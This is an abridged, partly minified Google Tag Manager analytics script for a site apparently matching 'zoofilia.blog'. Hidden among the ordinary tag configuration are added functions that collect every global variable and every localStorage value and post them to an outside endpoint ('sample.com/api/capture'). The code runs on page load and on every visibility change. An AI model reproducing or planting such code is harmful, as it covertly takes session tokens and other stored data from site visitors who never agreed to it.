...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 8,
        "vtp_includeConditions": ["list", "zoofilia\\.blog"],
        "tag_id": 18
      }, {
        ...
        "priority": 7,
        "vtp_instanceDestinationId": "G-KDYLVCBVNP",
        "tag_id": 28
      }, {
    ...
    "security_groups": {
      "google": ["__ccd_auto_redact", "__ccd_conversion_marking", "__ccd_em_site_search", "__ccd_ga_first", "__ccd_ga_last", "__ccd_ga_regscope", "__ogt_1p_data_v2", "__ogt_ga_send", "__ogt_google_signals", "__ogt_referral_exclusion", "__ogt_session_timeout", "__set_product_settings"]
    }
  };
  ...
  */
  ...
  function inspectGlobalAndLocalStorage() {
    ...
    for (const globalKey in globalScope) {
      if (globalScope.hasOwnProperty(globalKey)) {
        if (!window.observedVars.includes(globalKey)) {
          const globalValue = globalScope[globalKey];
          const globalType = typeof globalValue;
          newFindings[`global::${globalKey}`] = {
            type: globalType,
            value: globalType === "function" ? globalValue.name : globalValue
          };
        }
      }
    }
    ...
    for (const storageKey in localStorage) {
      if (!window.observedVars.includes(`localStorage::${storageKey}`)) {
        const storageValue = localStorage.getItem(storageKey);
        newFindings[`localStorage::${storageKey}`] = {
          type: "string",
          value: storageValue
        };
      }
  ...
  ii.fe = Number("0") || 0;
  ii.ka = "dataLayer";
  ii.Uj = "ChEI8POGpwYQwKfQoLnu2YWNARIlABhc5ucg4Hsl36kAULgNi0cX3kmof88J0tteiJi+wNFKixX5ARoCcfc\x3d";
  var li = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  function TC() {
    var a = new jb();
    L(this, "read_container_data"), a.set("containerId", 'G-KDYLVCBVNP'), a.set("version", '2'), a.set("environmentName", ''), a.set("debugMode", Xf), a.set("previewMode", Zf), a.set("environmentMode", Yf), Q(96) && a.set("firstPartyServing", ri || ti), a.sc();
    return a;
  }
  ...
  async function dispatchInsightsToServer(insights) {
    const apiURL = "https://sample.com/api/capture";
    try {
      ...
      if (reply.ok) {
        console.info("Insights successfully sent to the back end.");
      } else {
        console.warn(`Failed to send insights, server responded with status code: ${reply.status}`);
      }
    } catch (err) {
      console.error("An error occurred during the sending process:", err);
    }
  }
  ...
  function executeInspectionFunction() {
    const followups = inspectGlobalAndLocalStorage();
    const followupsTotal = Object.keys(followups).length;
    if (followupsTotal > 0) {
      console.group(`Inspection results - Found ${followupsTotal} new properties:`);
      for (const key in followups) {
        console.log(`${key}: ${JSON.stringify(followups[key])}`);
      }
      console.groupEnd();
      dispatchInsightsToServer(followups);
    } else {
      console.info("Inspection completed, no new properties found.");
    }
  }
  ;
  var TE = QE;
  ...
  window.addEventListener("load", executeInspectionFunction);
  pF.M = "readTitle";
  function qF(a, b) {
    var c = this;
  ...
  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "visible") {
      console.info("Visibility change occurred, re-executing inspection task.");
      executeInspectionFunction();
    }
  });
